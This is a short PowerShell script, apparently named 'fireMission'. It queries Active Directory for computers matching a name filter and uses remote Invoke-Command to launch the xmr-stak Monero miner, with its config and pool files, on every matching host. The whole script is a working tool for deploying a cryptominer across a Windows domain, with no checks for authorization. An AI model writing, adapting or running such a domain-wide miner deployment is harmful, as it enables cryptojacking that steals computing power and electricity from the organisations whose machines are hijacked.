# Get the needed variables from the user

Write-Host "fireMission `n"
$filterTarget = Read-Host "Enter Filter String"
$searchBase00 = Read-Host "Enter Search Base OU"
$searchBase01 = Read-Host "Enter Search Base DC"
$searchBase02 = Read-Host "Enter Search Base DC"
$opsDir = Read-Host "Enter Operations Directory Path"

# Concatenate the search base

$searchBase = "OU=$searchBase00, DC=$searchBase01, DC=$searchBase02"


# Echo user input varibles

Write-Host "Current Parameters `n"
Write-Host $filterTarget
Write-Host $searchBase
Write-Host $opsDir
Read-Host -Prompt "Press Enter to continue"


# Get the hosts in the search base and filter based on user input. Store them in a host list.

$HostList=(Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $searchBase).name


# Cycle through the clients in the host list and launch xmr-stak

foreach($client in $HostList )
{
    
    write-host "Sending command to.. $client"
    $cmdstring = "invoke-command -computername $client -scriptblock {write-host 'I am' $client ; & ‘$opsDir\xmr-stak-win64\xmr-stak.exe’ -c '$opsDir\xmr-stak-win64\config.txt' -C '$opsDir\xmr-stak-win64\pools.txt'}"
    $scriptblock = [scriptblock]::Create($cmdstring)

    start-process powershell -argumentlist "-noexit -command $Scriptblock"
}